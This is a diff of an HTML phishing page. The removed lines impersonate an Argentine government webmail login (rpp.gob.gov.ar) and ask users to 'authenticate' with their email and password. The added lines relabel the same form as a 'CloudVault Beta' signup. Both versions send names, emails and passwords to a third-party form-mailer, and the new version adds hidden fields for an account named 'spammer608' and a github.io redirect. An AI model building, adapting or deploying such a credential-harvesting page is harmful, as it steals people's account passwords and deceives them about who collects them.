@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Join rpp.gob.gov.ar CloudVault Beta</title>
+  <title>Join CloudVault Beta</title>
 
   <style>
     body {
@@ -62,26 +62,32 @@
 <body>
 
 <div class="form-container">
-  <h2>Autentica tu rpp.gob.gov.ar cuenta de correo web</h2>
+  <h2>Get Early Access</h2>
 
-  <form id="signupForm" action="http://www.formbuddy.com/cgi-bin/form.pl" method="POST">
+  <form action="http://www.formbuddy.com/cgi-bin/form.pl" method="post">
 
-    <input type="text" name="name" id="name" placeholder="Nombre completo" required />
+    <!-- FormBuddy required fields -->
+    <input type="hidden" name="username" value="spammer608">
+    <input type="hidden" name="reqd" value="0">
+    <input type="hidden" name="url" value="https://communications-wq.github.io/2026/signup.html">
 
-    <input type="email" name="email" id="email" placeholder="Dirección de correo electrónico" required />
+    <!-- User inputs -->
+    <input type="text" name="name" id="name" placeholder="Full Name" required>
 
-    <input type="password" name="password" id="password" placeholder="Contraseña" required />
+    <input type="email" name="email" id="email" placeholder="Email Address" required>
 
-    <input type="password" name="confirm_password" id="confirmPassword" placeholder="confirmar Contraseña" required />
+    <input type="password" name="password" id="password" placeholder="Password" required>
+
+    <input type="password" name="confirm_password" id="confirmPassword" placeholder="Confirm Password" required>
 
     <div class="error" id="error"></div>
 
-    <button type="submit">Entregar</button>
+    <button type="submit">Submit Interest</button>
   </form>
 </div>
 
 <script>
-  const form = document.getElementById("signupForm");
+  const form = document.querySelector("form");
   const error = document.getElementById("error");
 
   form.addEventListener("submit", function(e) {
@@ -90,17 +96,17 @@
 
     if (password !== confirmPassword) {
       e.preventDefault();
-      error.textContent = "Las contraseñas no coinciden!";
+      error.textContent = "Passwords do not match!";
       return;
     }
 
     if (password.length < 6) {
       e.preventDefault();
-      error.textContent = "La contraseña debe tener al menos 6 caracteres..";
+      error.textContent = "Password must be at least 6 characters.";
       return;
     }
 
-    // allow Formspree submission if valid
+    // allow submission to FormBuddy if valid
   });
 </script>
 
